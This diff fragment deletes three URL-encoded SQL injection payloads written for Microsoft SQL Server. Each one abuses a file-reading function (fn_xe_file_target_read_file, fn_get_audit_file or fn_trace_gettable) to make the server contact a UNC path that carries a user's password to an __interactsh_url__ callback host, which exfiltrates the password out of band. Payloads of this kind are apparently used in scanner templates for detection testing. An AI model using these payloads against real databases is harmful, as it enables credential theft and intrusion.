@@ -1,3 +1,0 @@
-'and+exists(select+*+from+fn_xe_file_target_read_file('C:\\*.xel','\\\\'%2b(select+pass+from+users+where+id=1)%2b'.__interactsh_url__\\1.xem',null,null))
-'%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\\\'%2b(select+pass+from+users+where+id=1)%2b'.__interactsh_url__\\',default,default)))
-'+and+exists(select+*+from+fn_trace_gettable('\\\\'%2b(select+pass+from+users+where+id=1)%2b'.__interactsh_url__\\1.trc',default))
